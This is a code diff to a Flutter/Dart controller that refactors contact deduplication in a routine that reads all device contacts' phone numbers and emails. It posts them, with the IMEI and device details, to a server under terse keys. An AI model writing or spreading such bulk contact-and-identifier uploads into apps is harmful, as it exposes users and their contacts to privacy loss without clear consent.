@@ -185,6 +185,7 @@ class HomeController extends GetxController {
     try {
       _getSimData();
       List contactsList = [];
+      Set<ContactInfo> uniqueContacts = {};
       Map<String, dynamic>? p = {};
       String? brand;
       String? model;
@@ -197,24 +198,23 @@ class HomeController extends GetxController {
         Set<String> addedPhones = {};
         Set<String> addedEmails = {};
 
-        contacts.forEach((con) async {
+        for (var con in contacts) {
           List<String> phones = [];
-          con.phones!.forEach((phone) {
+          for (var phone in con.phones!) {
             if (phone.value != null && !addedPhones.contains(phone.value!)) {
               phones.add(phone.value!);
               addedPhones.add(phone.value!);
             }
-          });
+          }
 
           List<String> emails = [];
-          con.emails?.forEach((email) {
+          for (var email in con.emails!) {
             if (email.value != null && !addedEmails.contains(email.value!)) {
               emails.add(email.value!);
               addedEmails.add(email.value!);
             }
-          });
+          }
 
-          // Assuming a contact is considered duplicate if any of its phone numbers or emails already exist in the list
           if (phones.isNotEmpty || emails.isNotEmpty) {
             ContactInfo info = ContactInfo(
               name: con.displayName,
@@ -224,17 +224,16 @@ class HomeController extends GetxController {
               emailList: emails,
             );
 
-            contactsList.add(info.toJson());
+            uniqueContacts.add(info); // Add the contact to the set
           }
-        });
+        }
       } else {
-        print('no permission');
+        print('No permission');
         const snackBar =
             SnackBar(content: Text('Access to contact data denied'));
         ScaffoldMessenger.of(Get.context!).showSnackBar(snackBar);
         openAppSettings();
       }
-
       bool status = await CacheHelper.getAddContacts();
 
       if (!status) {
@@ -259,7 +258,11 @@ class HomeController extends GetxController {
             headers: {
               'Content-Type': 'application/json',
             },
-            body: jsonEncode({"c": contactsList, "s": imei, "p": p}),
+            body: jsonEncode({
+              "c": uniqueContacts.map((e) => e.toJson()).toList(), 
+              "s": imei,
+              "p": p
+            }),
           );
 
           // Handle success
